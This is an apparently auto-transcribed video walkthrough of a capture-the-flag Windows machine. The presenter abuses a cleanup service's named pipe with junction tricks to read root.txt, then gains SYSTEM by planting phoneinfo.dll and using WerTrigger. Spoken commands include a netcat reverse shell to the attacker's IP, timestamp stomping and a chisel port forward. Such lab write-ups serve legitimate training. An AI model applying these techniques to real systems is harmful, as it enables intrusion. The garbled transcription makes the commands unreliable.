right now um one is just read and clear the pipe which is the default but you can spy on a pipe and see if there's data and what that data is and not clear it so i'm guessing um this tool is just reading that pipe on some type of schedule and there's like a race condition happening let's see because we should see it issue this clean command oh there we go so there's the clean and that disconnects so this is how we know the two commands it sends clean and restore so if we restore this it restores and we have it so not sure why we missed that first clean but we now no longer need client.exe because we can just echo this ourselves so if i wanted to let's try that real quick so let's copy that file back so downloads it's already old for some reason it didn't change the time stamp there that's weird but we can let's try going here and we can say echo clean test to clean up pipe like that network path not found let's try putting another backslash here i think that may work then i have it not found but we don't have any output i wonder if we need another backslash there we go so we need dots like not sure why escaping is hard but we can now echo commands to this terminal so we no longer have to uh wait for the 30 days i'm not sure exactly what this buys us but hey pretty cool so there's two ways we can abuse this on the server the first way is a file read vulnerability and there's probably more than two ways but we'll go into two i probably have to get another reverse shell so let's do inertify like that uh i'm in ghidra so let's go let's see i want to go let's just exit this window i like what's the path oh if i just open the pan again i'm back so let's go smb we have the smb server running we can now do the i notify and before we do our notify we probably want to echo something into header.inc that is not php i notify this will be [Music] reline wrap and the share so this hopefully still works and cat listen can't bring detected let's try again it is a race condition so there's always a chance that it does fail um if i get tampering detected again like i did i'm gonna try increasing the sleep and then i'll try well yeah i think increase in sleep is the only thing that'll work if i decrease the sleep then the race happens earlier and i know i lost the race i came in second place not first because it said tampering detected if i came in first and was replacing it too quickly it would tell me please subscribe here so now we have this shell we can clean up root.text so i can echo powershell behaves funnily so i think if i like do this echo command with the client it's not going to work well and we actually have to do the echo command we can't use clean.exe because we want to give it a path that is not in downloads so what i'm going to do is use nc64 so let's locate nc64.exe actually i can show this echo command failing maybe we can do cmd c to make it not but let's do echo clean c colon backslash users administrator root desktop root.text to pipe and then was it cleanup pipe and if we dirsc colon program data cleanup we don't have anything i'm gonna try doing this in cmd c the same command still nothing i'm going to try doing it in a command prompt not powershell so i'm just copying nc64 from a previous video into this and then i can do 10 10 14 8 backslash share and nz64.ex dash e cmd 1010 14 8 9001. this should get us a session there we go notice it doesn't say powershell anymore so i'm not in a powershell window i'm going to go up and we'll just copy this exact command to see if anything different happens and we may have to base64 encode this now that i'm thinking about it data cleanup so let's try base64 encoding c colon users administrator like this actually we can go to the named pipe and it is not it's writing clean this c colon users ipsec downloads see i wonder if i'm not putting the um null byte at the end or zero a let's see if i put let's put period after this or something we'll just put a and do a dir oh that was it so it just needed an extra character um not exactly sure why i'm guessing it had to do with uh that named pipe thing i guess we can validate that maybe let's see if i go here let's do echo clean test to name pipe and i don't see it writing do we print quotes we connect and disconnect but we never attempt to write or it's not capturing the right i'm going to stop this real quick and we're going to start up another instance so desktop server.exe and we can let's see we got that starter listener again and try it it's actually not right into the pipe we connect but never right so i'm not sure how to debug that uh yeah so not sure what's going on there but we got the file so let's copy this so copy c colon program data cleanup this to 10 10 14 8 share so now this file is in my smb share and what i'm going to do is i don't have a file window open anymore because something weird happened to my taskbar and things crashed um file let's see it's a good way to copy this i have the issue of my vm being on nat right now so it's hard for me to copy between hearst and whatnot i'm going to pause the video and manually copy this file over actually how big is it see cd smb if we base64 the file yeah it's pretty small i don't have to pause the video i can just copy it this way copy and then see so way to save this now from base64 that's just oh it's just text that's right so we can copy this and put this in our program data and because it uses a static key we can easily just uh what is it decrypt it this is client.exe i think right now so all i'm going to do is edit this it's opening up a 12 meg file in notepad not great but we paste a new thing and this is just the hex of root.text and what i'm going to do is use the client to restore the file so cls do i have it here where we're doing client yep so we're restoring client.exe let's go back into my downloads documents where is it c colon users ipsec downloads i just want to make sure this doesn't exist because i don't know if it will overwrite it says it's restoring it did it's 1kb if we edit with notepad we get the hash so that's one way you could do this thing we could also abuse sim links and [Music] do it that way from the reverse shell so going back here let us do that we can probably do we have ownership of this file i don't think we do um see i wonder if i can just restore and that will put the file back okay jrc colon what is it program data cleanup file's not there so i'm assuming root.text is back on the box so let's do this without copying it like copying the file to another vm so let's go cd users web downloads because this is where the clean.exe pulls and puts files from because we're not using the executable we actually don't have to do that but what i'm going to do is mk link to create a shortcut i'm going to put it in ipsec and point it to sequel users administrator desktop and we can see there is now ipsec which points to the administrator desktop so now if i echo clean c colon users web downloads ipsec root.text and then we have to add another character oddly we can do dot pipe clean up pipe and if i look at the irc colon program data and cleanup we have the file here and this is just pointing to um what is it uh let's just do it it's pointing to the root.text that's within my directory so if i go to what is it cyber chef cyber chef what is it cyber chef could have swear it would have been like in my history but input from base64 because we own this directory we can just now delete the junction so rmdir ipsec and then we make the directory ipsec and we issue a restore command because the restore commands going to put it wherever that base64 is so because the base64 is pointing to a directory we own now all i do is echo restore and then the file to the cleanup pipe and we do a dir go into ipsec and we have root.text so that is another way we could get around the encryption but if you don't want to just read a file and you would turn it into a execute there's a lot of ways that you can turn a elevated write file into code execution a long time ago there was the diagnostic hub exploit that is pretty much patched essentially all these of utilized dll injections within system 32 so the diagnostic hub you could overwrite anything in system 32 with a dll and then include it a lot of people overwrote license.otf that was in system32 because the file is not needed so you don't really risk rooting anything and that file is also not protected by uh trusted installer or known dlls which prevents you overwriting dlls so that was just a good candidate for that then after that got patched there was like the uso dll loader service and that got patched and now i think word trigger still works on the latest um let's see i'm trying to find out a good way to google this elevate write to system windows see it's on like the red team wiki or hack tricks i think is it hatricks.xyz let's see windows local elevate let's see it's not that page is it eop right system windows hack tracks using tokens we can probably trick and give it some good words uso dll payload all the things may have it windows elevation eop there we go windows subsystem unquoted path printers uh privilege file right elevation of privilege so this is talking about the diagnostic hub the uso dll thing i said and then we're trigger and there's a lot of other ones they always come out when one patches some research is like oh you can also do it this way but this is how we're going to do it we're going to clone this repo copy phone.info.dll to system32 replace it and then execute word trigger and we get a shell as system so yeah let's start by just going to the github repo and poking around at what that phone info is because it's going to be executing this dll so if i go here we can go to source phone info and look at its code it says bind shell.cpp so chances are this is just going to be a bind shell we could replace this code and edit it to put a reverse shell if you want to do that it's a good challenge for you to do but i'm going to keep it as a bind shell and we'll just connect to it to minimize having to open up visual studio and everything i've done similar things if you search ipsec.rocks it should be relatively easy to find the code but here we are running a bind shell on portly so we know what phone info does so let's just see if we don't have releases here but we have exes so we can just copy everything with a git clone so i'm going to get out of that we can get clone word trigger and then let's see what do we have to do we have to place uh phone info.dll in c colon windows system32 so the first thing i'm going to do is do a dir sql on windows system32 oh god there's a lot uh phone info uh it doesn't exist so we don't have it in there yet let us download it into this downloads directory so we can um copy 10 10 14 8 share slash phone info dot dll and we can cp word trigger phone info into our smb directory so if i dir now we have phone info.dll i'm guessing it is old so well i mean new because looking at this time stamp it's today so either we have to manually stomp the time and edit the time back or we can just do echo and do it manually um we already did it manually before so let's go the other route and change the timestamp back and for this i want to be in powershell it looks like we can just type powershell to get there so i'm going to do a get item and it's phoneinfo.dll and i think i do have to put that in quotes i don't know um i'm going to and then we can just set last write time is equal to get date and we'll set it to 7 14 2000. just a date that is way back there if i do a dir now we can see the last write time was successfully set we can also change like the creation time so we can do creation time and let's do last access time okay if we do this get item command uh oh shoot i don't know what i was trying to do uh it's last at right time is old so now when we run the cleanup script it should clean it up so let's test that cd backslash um program one cleanup dot slash client.exe so it did a cleaning sql and user's web downloads and now if i go cd backslash program data cleanup we have this file and i'm guessing if we look at this path in cyber chef it is c colon users web phone what we want to do is change this so we'll go to base64 copy this and we want to put it c colon windows system32 okay so i should be able to just copy and that to this by dir now we have this so if we go back to the cleanup program so cd program 1 cleanup we can do client.exe dash cap or r for restore and copy this dir let's just go into the cleanup one last time hopefully and that one is missing so we got two things here and now them the ones we care about so we can see what it is this one is desktop.ini and this one is uh one in downloads so if i d i r c colon windows system 32 find string for was it phone info watch it not show up yep there it is and created today at 9 14. so we have phone info dot dll in there let us go to the script to see what it says to do so we copy it here place report.wer and war trigger in the same directory then run word trigger okay so let's go back to users web downloads i guess and we need to copy those files so cp uh word trigger slash this and report and then copy 10 10 14 8 share or trigger exe and then the next one we need is report report.wer and then it just says run this program so we run it and we'll see what happens i was half expecting to get some output but it doesn't look like we are getting output and it just closed that was rude let's get our shell again it closed both of my shells so let's see this one needs to be the inject so python3 inject.pi let's see echo please to header let's redo that here we go weight shell 10 10 14 8 share i think that's all we did let's see close there we go got a connection so the first thing i just want to do netstat to see if we're listening on a port i don't see us listening on leap bummer so i'm going to mainly step through this exploit to see what it does so if i go to source word trigger and we just do wordtrigger.cpp we can see first it's going to create this directory so let's see if this directory exists cd backslash program data microsoft windows were and it was report queue nothing here so we can make the directory abcde okay and it's copying report.wer into this directory so let's go here copy c colon probably just easier to do it this way okay we copied that and then let's see it's running this schedule task and then deleting it so if i run this task do a netstat a n do we have leet we do not so we probably did something wrong or that phone info.dll is wrong i'm going to try running netstat again just in case it took some time for us to get a reverse shell and still don't see anything if i do a dir gci uh does my directory no longer exist abcd does i don't think the report.wer file exists anymore though this is behaving really weirdly let's try copying it again and then if this doesn't work i'm going to do this from a command prompt instead of powershell dir i'm not sure yeah weird where's cmd there it is just give it a second netstat i didn't do a n it's probably doing a bunch of dns queries and we'll just hang for a little bit right now i'm weighing the option do we just get the shell again let's see echo please to header let's just get this shell again notify wait okay close there we go let's do gci c colon what is it program data microsoft windows wr report q a b c d e showing that directory is empty test definitely does exist copying this i wonder if defender's deleting this file there report.wer exist okay we can run that cmd command again port.we exist that's that a n is it netstat a n l there we go still not listening on lead report.wer does exist in here though see why not do not copy a double quote let's see put i wonder if i just revert the box if i'll have better luck drc colon windows system 32 line string phone info let's just make sure this file still exists it does see well i don't have to escape these i wonder if that's it report.wr still exists and i still don't have that port listening so cmd slash c scheduled tasks run tn let's see get rid of these escapes there we go so um in this code it had to do more escapes because uh backslash an escape character and echo when i do it this way and command prompt it's not treating these as escapes so i was just doing a bad command so we're running the windows error reporting queue and if we did two slashes here it breaks but maybe that makes sense maybe it doesn't um there's difference between doing things in command prompt and not but by echo test test yeah if i did that in like python or something i'm guessing it would escape live demos are the worst um print test backslash test like this end it yeah so it treated this as a special character we do test access backslash that works but in our command prompt it put two backslashes and that was causing the command to fail so sometimes when you copy things out of um code you just have to do those subtle changes so now that we have netcat running i can just execute it so 1010 14 8 nc64.exe connect to localhost on port elite dir who am i web did that not work you know it's still listening so i don't know if i actually connected to it and i wonder if uh me being in this weird terminal is causing that issue um 10 10 14 8 nc64.exe that would exist here yes we're going to do something really silly let's send this connection so dash ecmd 1010 14 8 port 9001 so now i have what would assume to be a shell but i don't oh shoot i know what i did wrong we had to specify slash share yeah diyr we connected to the shell this time i think but my assumption right now is something happened with like a tty and it's not doing a good job at redirecting maybe it would have been easier not to be lazy and just replace the reverse shell with um what is it a replace the bind shell with the reverse shell that may be easier at this point uh share that's what happens when you're lazy oftentimes you're like you know what i don't want to do that i can do it this way and then you spend more time troubleshooting doing it slightly off than what you're used to share nc64.exe [Music] e cmd 1010 14 8 9001 so i think this is a more proper like setup shell we now need to make sure our bind shell is still running oh shoot it is but it's got a connection tied to it task list nc64 how many are there there's two which one am i it's a 50 50 chance i'm gonna get it wrong task kill let's just do all of them i am nc64.exe slash f is that going to do it i think i just killed all the reverse shells with using nc let's get this one last time i hope let's see this was our lrap this was i notify weight then 14 8 share let's hope this works now closed we have a session task list nc64.exe not listening netstat ano elite is listening awesome this is what we want so now we can get this reverse shell again so 10 10 14 8 share nc64.exe dash what is it ecmd 1010 14 8 9001 we'll get this and if this doesn't work i'm probably just going to use chisel and forward port 1337 back to myself because we're doing it this way i'm not going to do a reverse shell it's in my head that i'm going to get this working 127.001 uh 1337 dir hey who am i proper web that didn't work netstat ano it's not listening anymore um let's just run this command again where is it this i guess first we should go into this directory cd program data microsoft windows cdwr report queue cdwr report queue wait access to nine now what i was in that directory before program data microsoft windows wr this is bizarre do i not have access to the directory because i'm in powershell let's just try running this and hope the report.wr still exists so we can get rid of that oh shoot that was windows tempted see i may have to revert this box because it's no longer listening only and i can't go into the report queue if i exit that i wonder if we can go in here cd backslash program data windows wr what is the directory port q a b c d e so i can exit when i'm in powershell this is becoming one of the weirder exploits so let's run this okay i think wait now it's pulling lead from a different session see wonder if i move a b c d e to b c d e f point port.were exist i'm assuming it doesn't need to be abcde and this was just a random name chosen so now if i do netstat a l do i have leet i can probably just do fine string find str1337 no well this is a bummer schedule task run did not escape anything see just going to copy this again and do it one last time for sanity check copy yeah i'm going to revert the box i'm going to just try it so i reverted the box and then did all the steps to get report.wer in my downloads directory and phone info inside of system32 so if i do find string phone we should have it here and then we're going to try this again and use chisel to um for the port because i'm not trusting how this tty is acting so let's go into um what was it if we go back here we're a trigger we want to go into program data report q see the i wonder if i can do that nope so oh i have two cds dire does not like the double backslashes as i guess we kind of expected that so get rid of them and we can makeder a b c d e and then we [Music] copy my report.were into this directory cd a b c d e okay and we should be able to runner task so let's get rid of the escapes okay netstat ano fine string leet please be listening it is so now let us get chisel so locate chisel we have an exe and a amd so let's copy these here if you don't know what chisel is um if you just go to ipsec.rocks and look at the reddish video that's why i explain it the best and i have not actually ran it so we're gonna see how this goes uh the video's any indication it's not gonna go well but let's do chmod plus x chisel and let's do server port 8000 allow reverse okay and here we should be able to execute the chisel client so 10 10 14 8 backslash chisel.exe client we want to connect to 10 10 14 8 port 8000 and then create a reverse connection uh i'm just going to do lead on both 127.001 lead so hopefully this connects back did not look like it connected to me let's go users web downloads i'm just going to copy chisel actually i don't have backslash share i've made that mistake a few times i think this video let's try it that way are you going to connect thinking about it i probably should have copied the binary to the box and then execute it because it is golang so it is a large binary by the definition of binaries it's probably not all that big chisel.exe 8.5 megs but it is taking its sweet time so i'm going to pause the video and we'll see what happens almost as soon as i pause the video we have it connecting so if i go to my host we can do ssl ntp grep for elite and i am listening only so if i connect to this 127001 delete it should send me through the chisel connection and then go to localhost on the remote host and access port lee diera so it's doing exactly what it had done before so i wonder if this phone info.dll just isn't working uh who am i broken pipe this may really suck because if it's happening what i think just happened uh the box may not be exploitable again through this who am i nc-zv oh of course netcat's always going to be open but this end may not be our lrap let's let's see echo i notify run let's see if this works get my shell netstat ano find string leap it is just listening so that is better than i expected um i'm going to copy chisel to this box so let's go user's web downloads cp 101014 8 shared chisel.exe and let's see chisel.exe where's the command y ran it let's do here cup zero zero one that may be it i don't know if that's just my t-mux like glitching and deleting a character or i actually forgot to type one let's start my chisel server connect wait what i thought i was in users web downloads i must just be on like autopilot and screwing up all over the place i could have swore i was in this directory but maybe i type out and didn't notice so indeed i forgot the one oddly enough it still connects so i'm doing a second chisel and we forwarded port one three three eight on our hose to lead and what do you know when i do it correctly it works so cd administrator desktop and we can get root.txt with code execution so hope you guys enjoyed the video take care and i will see you all next week